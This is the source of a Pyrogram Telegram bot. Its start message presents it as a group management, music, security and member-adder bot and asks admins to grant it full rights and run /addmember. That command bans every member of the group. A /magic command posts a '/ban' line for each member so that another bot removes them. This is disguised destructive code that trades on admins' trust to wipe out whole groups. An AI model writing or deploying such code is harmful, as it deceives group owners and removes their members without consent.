import asyncio

from pyrogram.errors.exceptions.flood_420 import FloodWait
from pyrogram import Client,filters
from pyrogram.types import *
from .config import Config
import logging
from pyrogram.errors import (
    ChatAdminRequired
)
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

if not Config.TELEGRAM_TOKEN:
   bot=Client(api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,session_name=Config.PYRO_SESSION)   
else:
   bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)

@bot.on_message(filters.command("addmember"))
async def _(bot, msg):
    print("getting memebers from {}".format(msg.chat.id))
    async for i in bot.iter_chat_members(msg.chat.id):
        try:
            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
            print("kicked {} from {}".format(i.user.id,msg.chat.id))
        except FloodWait as e:
            await asyncio.sleep(e.x)
            print(e)
        except Exception as e:
            print(" failed to kicked {} from {}".format(i.user.id,e))           
    print("process completed")


@bot.on_message(filters.command("magic"))
async def mban(bot, msg):
    print("getting memebers from {}".format(msg.chat.id))
    async for i in bot.iter_chat_members(msg.chat.id):
        try:
            await bot.send_message(msg.chat.id, f"/ban {i.user.id}")
        except FloodWait as e:
            await asyncio.sleep(e.x)
            print(e)
        except Exception as e:
            print(" failed to kicked {} from {}".format(i.user.id,e))           
    print("process completed")



@bot.on_message(filters.command(["start", "agora"]))
async def hello(bot, message):
    await message.reply("Hello, This is a magical bot Group Management + Music bot + Security bot + Group Members adder bot!\n\n Simply Promote my By Adminstration with full admin rights and type /addmember")
    
PM_START_TEXT = """
*ʜᴇʏᴏ 🦋 * {}, 💜
──────────────────
*๏ ɪ ᴀᴍ * {} !
──────────────────
➻ ᴛʜᴇ ᴍᴏsᴛ ᴘᴏᴡᴇʀғᴜʟʟ ɢʀᴏᴜᴘ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ᴀɴᴅ ʟᴀɢ ғʀᴇᴇ sᴛʀᴇᴀᴍɪɴɢ ʙᴏᴛ ᴡɪᴛʜ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀɴᴅ ᴀᴡᴇsᴏᴍᴇ ғᴇᴀᴛᴜʀᴇs.
──────────────────
*๏ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴏғ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴs ᴄᴏᴍᴍᴀɴᴅs.*
"""

buttons = [
    [
        InlineKeyboardButton(
            text="🫂 ᴛᴀᴋᴇ ᴍᴇ ʏᴏᴜ ᴡɪᴛʜ 🫂",
            url=f"https://t.me/missrose_bot?startgroup=true",
        ),
    ]
    [
        InlineKeyboardButton(text="🏘 ᴍʏ ʜᴏᴍᴇ 🏘", url=f"https://t.me/AGORAWORLD"),
    ],
    [
        InlineKeyboardButton(text="💋 ᴍʏ ʜᴜʙʙʏ 💋", url=f"https://t.me/MR_AGORA"),
        InlineKeyboardButton(text="👩‍💻 ᴍʏ ᴏғғɪᴄᴇ 👩‍💻", url=f"https://t.me/TEAMAGORA"),
    ],
]
